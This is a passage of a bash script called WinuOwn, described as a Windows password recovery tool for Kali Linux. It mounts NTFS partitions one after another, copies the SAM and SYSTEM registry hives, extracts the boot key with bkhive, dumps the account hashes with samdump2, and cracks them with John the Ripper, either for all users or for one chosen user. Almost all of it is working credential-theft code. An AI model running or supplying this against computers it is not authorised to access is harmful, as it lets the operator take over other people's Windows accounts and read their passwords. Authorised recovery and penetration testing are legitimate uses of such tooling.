                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '============================================       88%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc6 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '=============================================      90%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdc7 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '==============================================     92%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdd1 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '================================================   96%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdd2 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '=================================================  98%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdd3 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
echo -ne '================================================== 100%\r' 

if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
fi
                sudo mount /dev/sdd4 /media/windows/ -t ntfs -o nls=utf8,umask=0222 &>/dev/null
                if  [ -d /media/windows/WINDOWS/*32/*onfig/ ];
                then
                cd /media/windows/WINDOWS/*32/*onfig
                sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                sudo umount /media/windows/ &>/dev/null  	  
                  else
                  if [ -d /media/windows/*indows/*32/*onfig/ ];
	              then
                  cd /media/windows/*indows/*32/*onfig/
                  sudo cp SAM /etc/WinuOwn/SAM &>/dev/null
                  sudo cp SYSTEM /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp sam /etc/WinuOwn/SAM &>/dev/null
                  sudo cp system /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo cp System /etc/WinuOwn/SYSTEM &>/dev/null
                  sudo umount /media/windows/ &>/dev/null		
                  else
                  sudo umount /media/windows/ &>/dev/null   
                  fi
                fi
if  [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ] ; then
filecontroll
else
clear
echo -e "${WARNING} WinuOwn cannot find Windows partition please   ${END}"
echo -e "${WARNING} check that you are on a PC that have Windows   ${END}"
sleep 5	
echo -e "${WARP} Going back to menu   ${END}"
sleep 2
clear
show_menu
fi
}


####################################file control#############################################

manualcontroll()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
sleep 1
accounts_fn
else 
while true; do
   read -p 'I see no Windows partition in there... do you wish to try again?? (y/n)?' yn
   case $yn in
    [Yy]* ) manually_fn
            break;;
    [Nn]* ) echo "Exiting WinuOwn"
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
done
fi
}

controller1()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 
mount2_fn
fi
}

controll1_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 
echo -e "${INFOS}   Windows partition is hard to find.. Enabling deepscan    ${END}"
sleep 2
mount3_fn
fi
}

controll2_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 
echo -e "${INFOS}   Windows partition is hard to find.. scanning for fat32 partitions    ${END}"
sleep 2
mount4_fn
fi
}

controll3_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 

echo -e "${WARNING}                (example of partition is sda2 or sdb1)                 ${END}"
manually_fn
fi
}

####################################file control etc#############################################

controll_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 
echo -e "${INFOS}   Windows partition is hard to find.. Enabling deepscan    ${END}"
sleep 2
mount3_fn
fi
}
controlletc_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
while true; do
echo -e "${SUCCESS}                                                            ${END}"
echo -e "${SUCCESS}      Windows partition was found and files are loaded      ${END}"
echo -e "${SUCCESS}                                                            ${END}"
   read -p 'Do you want to start John the ripper? (y/n)?' yn
   case $yn in
    [Yy]* ) accounts_fn
            break;;
    [Nn]* ) echo -e "${INFOS}   Files are now stored in WinuOwn-folder for later cracking           ${END}"
            sleep 4
            clear
            show_menu
            break;;
    * ) echo 'Please answer yes or no.';;
   esac
done
else 
echo -e "${INFOS}   Windows partition is hard to find.. Enabling deepscan    ${END}"
sleep 2
mount3_fn
fi
}


#######################################crackings#####################################################

accounts_fn()
{
while true; do
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}Do you wish to crack all accounts or target a specific user?${END}"
echo -e "${INFOS}                                                            ${END}"
read -p '(all/target)?' all target
   case $all in
    [aA]* ) crackall_fn
              break;;
    [tT]* ) target_fn
                break;;
    * ) echo 'Please answer target or all.';;
   esac
done
}

#######################################crackings etc#####################################################

accountsetc_fn()
{
while true; do
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}Do you wish to crack all accounts or target a specific user?${END}"
echo -e "${INFOS}                                                            ${END}"
read -p '(all/target)?' all target
   case $all in
    [aA]* ) crackalletc_fn
              break;;
    [tT]* ) targetetc_fn
                break;;
    * ) echo 'Please answer target or all.';;
   esac
done
}

####################################file cracking############################################

target_fn()
{
echo -e "${BLACK}                                                                   ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}               prepearing john the ripper                   ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${BLACK}                                                                   ${END}"

cd /etc/WinuOwn
bkhive SYSTEM bootkey
sleep 1
samdump2 SAM bootkey >/etc/WinuOwn/hash.txt
cd /root/.john/
if [ -d /root/.john/potbackup ]
then 
mv john.pot /root/.john/potbackup/john.pot
else 
mkdir /root/.john/potbackup/ &>/dev/null
cat john.pot >> johnbackup.pot &>/dev/null
mv john.pot /root/.john/potbackup/john.pot
fi

clear 
echo -e "${INFOS}listing users....${END}"
cat /etc/WinuOwn/hash.txt
echo -e "${SUCCESS}please type in witch user you wish to crack${END}"
read User
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
clear
echo -e "${WARP}  Cracking....${END}"
sleep 1
john /etc/WinuOwn/hash.txt --session=prehash --format=nt -users:$User > /etc/WinuOwn/tmp.txt
clear
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${BLACK}  "${SUCCESS}v${END}  ---------------${END} "${SUCCESS}v${END}"           
echo -e "${BLACK}  "${SUCCESS}v${END}  ---------------${END} "${SUCCESS}v${END}"
sed '1d' /etc/WinuOwn/tmp.txt 
cat john.pot >> johnbackup.pot
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1 
            clear
            show_menu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
cat john.pot >> johnbackup.pot
}

crackall_fn()
{
cd /etc/WinuOwn
bkhive SYSTEM bootkey
sleep 1
samdump2 SAM bootkey >/etc/WinuOwn/hash.txt
cd /root/.john/
if [ -d /root/.john/potbackup ]
then 
mv john.pot /root/.john/potbackup/john.pot
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
else 
mkdir /root/.john/potbackup/ &>/dev/null
mv john.pot /root/.john/potbackup/john.pot
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
fi
clear
echo -e "${WARP}  Cracking....${END}"
sleep 1
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"           
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"                                    
john /etc/WinuOwn/hash.txt --session=prehash --format=nt 
cat john.pot >> johnbackup.pot
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1
            clear
            show_menu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
   cat john.pot >> johnbackup.pot
}

####################################file cracking etc############################################
targetetc_fn()
{
echo -e "${BLACK}                                                                   ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}               prepearing john the ripper                   ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${INFOS}                                                            ${END}"
echo -e "${BLACK}                                                                   ${END}"

sudo cp /etc/john/run/password.lst /etc/john/password.lst 
cd /etc/WinuOwn
sudo bkhive SYSTEM bootkey
sleep 1
samdump2 SAM bootkey >/etc/WinuOwn/hash.txt
cd /usr/share/john/
if [ -d /usr/share/john/potbackup ]
then 
sudo mv john.pot /usr/share/john/potbackup/john.pot
else 
sudo mkdir /usr/share/john/potbackup/ &>/dev/null
cat john.pot >> johnbackup.pot
sudo mv john.pot /usr/share/john/potbackup/john.pot
fi

clear
echo -e "${INFOS}listing users....${END}"
cat /etc/WinuOwn/hash.txt
echo -e "${SUCCESS}please type in witch user you wish to crack${END}"
read User
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
clear
echo -e "${WARP}  Cracking..ETC..${END}"
sleep 1
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${BLACK}  "${SUCCESS}v${END}  ---------------${END} "${SUCCESS}v${END}"           
echo -e "${BLACK}  "${SUCCESS}v${END}  ---------------${END} "${SUCCESS}v${END}"
cd /etc/john
sudo chmod +x john.log
john /etc/WinuOwn/hash.txt --incremental --format=LM -users:$User
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1 
            clear
            show_etcmenu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
cat john.pot >> johnbackup.pot
}

crackalletc_fn()
{
cd /etc/WinuOwn
bkhive SYSTEM bootkey
sleep 1
samdump2 SAM bootkey >/etc/WinuOwn/hash.txt
cd /etc/john/
if [ -d /etc/john/potbackup ]
then 
mv john.pot /etc/john/potbackup/john.pot
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
else 
mkdir /etc/john/potbackup/ &>/dev/null
mv john.pot /etc/john/potbackup/john.pot
clear
echo -e "${INFOS}             Starting John the ripper                   ${END}"
sleep 2
fi
clear
echo -e "${WARP}  Cracking....${END}"
sleep 1
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"           
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"                                    
cd /etc/john
sudo chmod +x john.log
john /etc/WinuOwn/hash.txt --incremental --format=LM 
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1
            clear
            show_etcmenu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac
   cat john.pot >> johnbackup.pot
}

####################Remove stored SAM,SYSTEM and hashes in WinuOwn-folder#########################

remove_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
   read -p 'Are you sure you want to remove ALL files and hashes in WinuOwn-folder?  (y/n)?' yn
   case $yn in
    [Yy]* ) echo '';;
           
    [Nn]* ) show_menu ;;
    * ) echo 'Please answer yes or no.';;
   esac
rm /etc/WinuOwn/SAM &>/dev/null
rm /etc/WinuOwn/SYSTEM &>/dev/null
rm /etc/WinuOwn/hash.txt &>/dev/null
rm /etc/WinuOwn/bootkey &>/dev/null
echo -e "${SUCCESS}  Files are now removed  ${END}"
sleep 2
clear
show_menu
else 
echo -e "${WARNING}  No Windows-login files are in WinuOwn-folder  ${END}"
sleep 4
clear
show_menu
fi
}

failsafe_fn()
{
show_menu
}

####################Remove stored SAM,SYSTEM and hashes in WinuOwn-folder etc#########################

removeetc_fn()
{
if [ -f /etc/WinuOwn/SYSTEM ] && [ -f /etc/WinuOwn/SAM ]
then 
   read -p 'Are you sure you want to remove ALL files and hashes in WinuOwn-folder?  (y/n)?' yn
   case $yn in
    [Yy]* ) echo '';;
           
    [Nn]* ) show_etcmenu ;;
    * ) echo 'Please answer yes or no.';;
   esac
rm /etc/WinuOwn/SAM &>/dev/null
rm /etc/WinuOwn/SYSTEM &>/dev/null
rm /etc/WinuOwn/hash.txt &>/dev/null
rm /etc/WinuOwn/bootkey &>/dev/null
echo -e "${SUCCESS}  Files are now removed  ${END}"
sleep 2
clear
show_etcmenu
else 
echo -e "${WARNING}  No Windows-login files are in WinuOwn-folder  ${END}"
sleep 4
clear
show_etcmenu
fi
}

failsafe_fn()
{
show_etcmenu
}

#####################################View stored passwords#######################################

oldpass_fn()
{
if [ -f /root/.john/johnbackup.pot ]
then
leafpad /root/.john/johnbackup.pot
clear
show_menu
else 
echo -e "${WARNING}No passwords stored${END}"
sleep 3
clear
show_menu
fi
}

#####################################View stored passwords etc#######################################

oldpassetc_fn()
{
if [ -f /etcjohn/johnbackup.pot ]
then
gedit /etc/john/johnbackup.pot
clear
show_etcmenu
else 
echo -e "${WARNING}No passwords stored${END}"
sleep 3
clear
show_etcmenu
fi
}

#####################################Restore previous session##################################

restore_fn()
{
if [ -f /root/.john/prehash.rec ]
then
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"           
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}" 
john --restore=prehash
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1
            clear
            show_menu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac


else
clear
echo -e "${WARNING} No previous sessions stored ${END}"
sleep 2
clear
fi
show_menu
}

#####################################Restore previous session etc##################################

restoreetc_fn()
{
if [ -f /etc/john/prehash.rec ]
then
echo -e "${SUCCESS} Passwords       Accounts ${END}"
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}"           
echo -e "${SUCCESS}   v ${END}"  -------------${END} "${SUCCESS}v${END}" 
john --restore=prehash
echo -e "${BLACK}                                                                 ${END}"
echo -e "${SUCCESS}                  WinuOwn is done cracking now                    ${END}"
   read -p 'Go back to menu? (y/n)?' yn
   case $yn in
    [Yy]* ) echo -e "${WARP}                 Going back to menu                              ${END}"
            sleep 1
            clear
            show_etcmenu;;
    [Nn]* ) echo "Exiting" $ver
            sleep 2        
            exit ;;
    * ) echo 'Please answer yes or no.';;
   esac


else
clear
echo -e "${WARNING} No previous sessions stored ${END}"
sleep 2
clear
fi
show_etcmenu
}

###########################################installation##############################################

installation1_fn()
{
if [ -d /root/.john ]
then
echo""
else
echo " I might be a program... but im not totaly retarded you know.. !"
sleep 4
clear
show_install
fi
echo 
sudo mkdir /etc/WinuOwn &>/dev/null
sudo mkdir /etc/WinuOwn/safe &>/dev/null
if [ -d /etc/WinuOwn ]
then 
echo -e "${NORMAL}        WinuOwn is now installed                        ${NORMAL}"
sleep 3
echo "Going to menu"
sleep 2
clear
newworld_fn
else
echo -e "${WARNING}Something went wrong and WinuOwn was not installed ${END}"
sleep 4
echo -e "${WARNING}                     Bye Bye                           ${END}"
sleep 3
exit
fi
}

installation2_fn()
{
if [ -d /root/.john ] 
then 
echo " I might be a program... but im not totaly retarded you know.. !"
sleep 4
clear
show_install
else
echo ""
fi
sudo mkdir /etc/WinuOwn &>/dev/null
sudo mkdir /etc/WinuOwn/safe &>/dev/null
if [ -d /etc/WinuOwn ] 
then
echo -e "${WARP}                   WinuOwn is now installed                                ${END}"
sleep 3
echo "You will need install John the ripper"
echo "jumbo packege to make WinuOwn work."
sleep 7
  if [[ ! -x /etc/john ]];then 
  echo -e "$warn\nNeed to install john the ripper"
  sleep 1
  echo -e "$q\nDo you want to do it now? (y/n)"
  read var
    if [[ $var == y ]];then
    sudo apt-get install john
    else
    echo""
    fi
  fi  
      if [[ ! -x /etc/bkhive ]];then
      echo -e "$warn\nNeed to install bkhive"
      sleep 1
      echo -e "$q\nDo you want to do it now? (y/n)"
      read var
        if [[ $var == y ]];then
        sudo apt-get install bkhive
        else
        echo""
        fi
      fi
    	  if [[ ! -x /etc/samdump2 ]];then
      echo -e "$warn\nNeed to install samdump2"
      sleep 1
      echo -e "$q\nDo you want to do it now? (y/n)"
      read var
            if [[ $var == y ]];then
        sudo apt-get install samdump2
        clear
        show_etcmenu
        else
        clear
        show_etcmenu
            fi
          fi
	
else
echo -e "${WARNING}Something went wrong and WinuOwn was not installed ${END}"
sleep 4
echo -e "${WARNING}                     Bye Bye                           ${END}"
sleep 2
exit
fi
clear
show_etcmenu
}

installation3_fn()
{
echo -e "${SUCCESS}  Remember.. in order to make WinuOwn work in Fedora   ${END}"
echo -e "${SUCCESS}   it needs to be executed in Root, if installation    ${END}"
echo -e "${SUCCESS}   fails try to login as root and install again        ${END}"
sleep 6
sudo mkdir /etc/WinuOwn &>/dev/null
sudo mkdir /etc/WinuOwn/safe &>/dev/null
if [ -d /etc/WinuOwn ] 
then
echo -e "${WARP}                   WinuOwn is now installed                                ${END}"
sleep 3
  if [[ ! -x /usr/share/john ]];then
  echo -e "$warn\nNeed to install john the ripper"
  sleep 1
  echo -e "$q\nDo you want to do it now? (y/n)"
  read var
    if [[ $var == y ]];then
    sudo yum install john
    else
    echo""
    fi
  fi  
      if [[ ! -x /usr/bin/bkhive ]];then
      echo -e "$warn\nNeed to install john the ripper"
      sleep 1
      echo -e "$q\nDo you want to do it now? (y/n)"
      read var
        if [[ $var == y ]];then
        sudo yum install bkhive
        else
        echo""
        fi
      fi
    	  if [[ ! -x /usr/bin/samdump2 ]];then
      echo -e "$warn\nNeed to install samdump2"
      sleep 1
      echo -e "$q\nDo you want to do it now? (y/n)"
      read var
            if [[ $var == y ]];then
        sudo yum install samdump2
        clear
        show_etcmenu
        else
        clear
        show_etcmenu
            fi
          fi
	
else
echo -e "${WARNING}Something went wrong and WinuOwn was not installed ${END}"
sleep 4
echo -e "${WARNING}                     Bye Bye                           ${END}"
sleep 2
exit
fi
clear
show_etcmenu
}

##############################################Installation_options###################################################
show_install()
{
    echo -e "${INTRO_TEXT}            Welcome to WinuOwn installation                   ${INTRO_TEXT}"
    echo -e "${INTRO_TEXT} Please select the system you wish to install WinuOwn to  ${INTRO_TEXT}"
    echo -e "${NORMAL}                                                              ${NORMAL}"
    echo -e "${MENU}*************************WinuOwn*By*Webbhatt******************${NORMAL}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 1)${MENU} Install to Kali Linux ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 2)${MENU} Install to Ubuntu ,unfinished build, for developers only. ${NORMAL}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*************************WinuOwn*By*Webbhatt******************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter a menu option and enter or ${RED_TEXT}enter to exit. ${NORMAL}"
    read ops
    while [ ops != '' ]
    do
    if [[ $ops = "" ]]; then 
            exit;
    else
        case $ops in
        1) clear;
        option_picked "Installing to Kali";
        installation1_fn;
        ;;

        2) clear;
            option_picked "Installing to Ubuntu";
            installation2_fn;
            ;;

        x)exit;
        ;;

        \n)exit;
        ;;

        *)clear;
        option_picked "Pick an option from the menu";
        ;;
    esac
fi
done
}

##############################################menu############################################################
show_menu(){
    echo -e "${INTRO_TEXT} WinuOwn is a Windows passwords recovery tool    ${INTRO_TEXT}"
    echo -e "${INTRO_TEXT}created for Kali linux by Pierre from Webbhatt  ${INTRO_TEXT}"
    echo -e "${NORMAL}                                                    ${NORMAL}"
    echo -e "${MENU}*****************WinuOwn*By*Webbhatt**************${NORMAL}"
